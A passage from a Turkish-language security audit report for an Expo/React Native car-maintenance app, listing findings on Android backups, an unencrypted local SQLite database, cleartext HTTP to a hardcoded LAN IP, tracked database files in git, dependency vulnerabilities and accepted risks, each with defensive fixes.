**Düzeltme:** `allowBackup: false` ayarını `app.config.ts`'in `android` bloğuna taşı,
`npx expo prebuild --clean` çalıştırıp native projeyi yeniden üret, manifest'te
`allowBackup="false"` olduğunu doğrula.

**Doğrulama:** `grep allowBackup android/app/src/main/AndroidManifest.xml` → `false` görülmeli.

**Kırılma riski:** Yok, davranışsal fark yalnızca backup/restore akışını etkiler.

---

### [SEC-008] Yerel SQLite veritabanı şifresiz
Severity: Medium | MASVS-STORAGE-1

**Konum:** `src/services/database.ts`

Araç, bakım ve yakıt kayıtları şifresiz SQLite'da duruyor. Veri hassasiyeti (kimlik/ödeme
bilgisi içermiyor) nedeniyle Critical değil ama kullanıcı bazlı ve kişisel olduğundan
sertleştirme önerilir. SEC-007 ile birlikte ele alınmalı (allowBackup kapatılırsa risk
büyük ölçüde azalır; SQLCipher P2 önceliğinde).

**Düzeltme:** Kısa vadede SEC-007'yi çöz (backup kapalı → risk düşer). Orta vadede
`op-sqlite` + SQLCipher veya alan bazlı şifreleme (hassas alanlar için) değerlendir.

---

### [SEC-009] Cleartext HTTP kullanımı (local API)
Severity: Medium | MASVS-NETWORK-1

**Konum:** `src/config/api.ts:4`, `.env:1-2`

`API_BASE_URL = http://192.168.1.117:3000/api` — geliştirici makinesinin LAN IP'si
hardcoded. Android API 28+ varsayılan olarak cleartext trafiği engeller (network security
config yok, minSdkVersion 24 olduğu için bazı cihazlarda hâlâ çalışabilir ama tutarsız
davranış riski var). Bu, prod build'e sızarsa hem işlevsel (geliştiricinin bilgisayarı
kapalıyken kırılır) hem güvenlik (MITM'e açık) sorun yaratır.

**Düzeltme:** Bu local-dev-only özellik prod build'den tamamen çıkarılmalı ya da gerçek
HTTPS endpoint'ine (varsa) yönlendirilmeli; `EXPO_PUBLIC_API_IP` gibi dev-only değerler
`.env.development` gibi ayrı bir dosyaya taşınıp prod `eas build` profilinde
tanımlanmamalı.

---

### [SEC-010] Uygulama veritabanı dosyaları git'e tracked
Severity: Low-Medium | MASVS-STORAGE-1

**Konum:** `backend/data/arabamcepte.db`, `-shm`, `-wal` — `git ls-files` çıktısında görünüyor.
DB dosyasının kendisi küçük (4KB, muhtemelen boş şema), ama WAL dosyası 82KB — gerçek test
verisi içerebilir (doğrulanmadı, binary içerik açılmadı). `.gitignore`'da `data/` var ama
zaten tracked olduğu için etkisiz (SEC-002 ile aynı kök neden: gitignore, zaten-tracked
dosyaları kapsamaz).

**Düzeltme:** `git rm -r --cached backend/data`, commit, ardından (eğer gerçek kullanıcı
verisi sızdıysa) SEC-002'deki gibi history temizliği.

---

### [SEC-011] Ana proje git repository değil
Severity: Low (süreç riski) | —

`C:\mobile` şu an versiyon kontrolü altında değil. Bu, kod inceleme/geri alma imkanı
vermiyor ama aynı zamanda "geçmişte sızmış secret" riski de henüz yok (repo başladığında
temiz başlanabilir). **Fix önerisi bu yüzden P0 değil P1** — ama git init edilmeden önce
mutlaka `.gitignore`'a `.env` eklenmeli (zaten root `.gitignore`'da `.env*.local` var ama
düz `.env` yok — bkz. aşağıdaki not).

**Ek not:** Root `.gitignore` dosyasında `.env*.local` deseni var ama **`.env`'in kendisi
yok**. Git init edilip `git add .` çalıştırılırsa, root `.env` (EXPO_PUBLIC_SCRIPT_KEY dahil)
doğrudan commit'lenir — `backend/`'de yaşanan hatanın birebir tekrarı olur.

---

### [SEC-012] Bağımlılık zafiyetleri
Severity: Low-Medium | MASVS-CODE-9

Root: 35 (1 critical: `tar`, 19 high — çoğu `@expo/fingerprint`, `browserslist`,
`brace-expansion`, `fast-uri`, `@xmldom/xmldom`, `axios` gibi build-time/transitive
bağımlılıklar; `axios` `src/` içinde hiç import edilmemiş — kullanılmıyor olabilir,
NEEDS-MANUAL-REVIEW). backend: 14 (1 critical: `shell-quote`, muhtemelen `ts-node-dev`
transitive'i, dev-only).

**Düzeltme:** `npm audit fix` (root ve backend ayrı ayrı), ardından kalan majör-versiyon
gerektirenler için manuel değerlendirme. Kullanılmayan `axios` bağımlılığını kaldırmayı
değerlendir.

---

### [SEC-005] Çözüldü — Apps Script kaynağı incelendi

Kullanıcı `.gs` kaynağını paylaştı (2026-09-22). Bulgular SEC-001 detay bloğuna ve yeni
SEC-016/SEC-017'ye işlendi. Ek gözlem: `SPREADSHEET_ID` sabiti tanımlı ama hiç kullanılmıyor
(`getActiveSpreadsheet()` kullanılıyor) — script yalnızca container-bound çalışır, güvenlik
etkisi yok, sadece ölü kod. `testAccess`/`testSheet` fonksiyonları debug amaçlı, `doGet`/`doPost`
üzerinden erişilemiyor, risk yok.

### [SEC-015] Çözüldü — kaynağı bulundu ve kaldırıldı

Kaynak: `RECORD_AUDIO` Expo'nun `expo-image-picker` plugin'i tarafından zaten build sırasında
otomatik engelleniyordu (`microphonePermission: false` ayarı sayesinde, manifest'te
`tools:node="remove"` olarak görünüyor — ek işlem gerekmedi). `SYSTEM_ALERT_WINDOW` ise iki
kaynaktan geliyordu:
1. Expo'nun **varsayılan şablon manifest'i** (`@expo/config-plugins/withAndroidBaseMods.js`) —
   pakete özgü değil, Expo'nun her yeni projeye eklediği "opsiyonel, gerekmiyorsa kaldır" izin
   listesinin bir parçası.
2. Uygulamada **hiç kullanılmayan** `@react-native-community/push-notification-ios` ve
   `react-native-push-notification` paketleri (uygulama zaten yalnızca `expo-notifications`
   kullanıyor) — kaldırıldı.

**Düzeltme:** İki ölü paket `package.json`'dan çıkarıldı; `app.config.ts`'e
`android.blockedPermissions: ['android.permission.SYSTEM_ALERT_WINDOW']` eklendi.
`npx expo prebuild --platform android --clean` sonrası doğrulandı — her iki izin de
manifest'te `tools:node="remove"` ile işaretli, final APK'da bulunmayacak.

### [SEC-013] Açık — bu ortamda denetlenemedi

iOS native projesi bu makinede üretilemedi: `npx expo prebuild --platform ios` denendi,
CocoaPods bağımlılık çözümlemesi macOS/Linux gerektiriyor, Windows'ta
`⚠️ Skipping generating the iOS native project files` ile başarısız oluyor. ATS, TLS pinning,
pasteboard/ekran koruması denetimi yalnızca bir Mac'te (veya EAS Build üzerinden) tekrar
denenerek yapılabilir. NEEDS-MANUAL-REVIEW olarak açık kalıyor.

---

## False Positive / Kabul Edilen Riskler

- `EXPO_PUBLIC_API_IP` / `EXPO_PUBLIC_API_PORT`: Bunlar zaten "public olması gereken"
  değerler kategorisinde (bir sunucu adresi, sır değil) — SEC-009'un asıl sorunu bunların
  *varlığı* değil, cleartext + hardcoded-dev-IP'nin prod'a sızma riski.
  Severity bu yüzden Medium'da tutuldu, Critical değil.
  <br><br>Zaten kod açık kaynaklı olsa da endpoint URL'sinin gizliliğine güvenilmiyor —
  asıl kontrol mekanizması olması gereken şey backend'in kendisi (SEC-005).
- Gemini API anahtarının **client'a hiç gönderilmemesi** (yalnızca backend/.env'de,
  ai.routes.ts sunucu tarafında kullanılıyor) doğru bir mimari karar — bu noktada ekstra
  bir "client'ta Gemini key" bulgusu **yok**, tebrik edilecek bir tasarım tercihi.
- Fiş tarama (FuelReceiptScanner) tamamen cihaz-üstü ML Kit OCR kullanıyor, fotoğraf hiçbir
  sunucuya yüklenmiyor — veri minimizasyonu açısından iyi.
